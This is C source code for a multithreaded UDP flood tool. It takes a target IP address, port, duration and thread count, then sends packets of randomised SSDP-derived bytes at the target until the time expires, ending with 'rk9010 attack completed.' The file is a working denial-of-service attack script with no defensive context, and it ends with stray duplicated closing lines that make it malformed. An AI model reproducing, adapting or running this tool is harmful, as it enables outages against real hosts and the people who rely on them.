#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>

#define PACKET_SIZE 150000
#define PAYLOAD_SIZE 200


void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00"[rand() % 16];
        buffer[i * 4 + 3] = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00"[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

void *udp_attack(void *args) {
    char **argv = (char **)args;
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1]; 

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        printf("Error: Could not create socket! Reason: %s\n", strerror(errno));
        pthread_exit(NULL);
    }


    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);


    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        printf("Error: Invalid IP address - %s\n", target_ip);
        close(sock);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {

        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            printf("Error sending packet: %s\n", strerror(errno));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    int threads_count = atoi(argv[4]);
    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, udp_attack, (void*)argv)) {
            printf("Error: Could not create thread %d. Reason: %s\n", i, strerror(errno));
            return 1;
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("rk9010 attack completed.\n");
    return 0;
}0;
}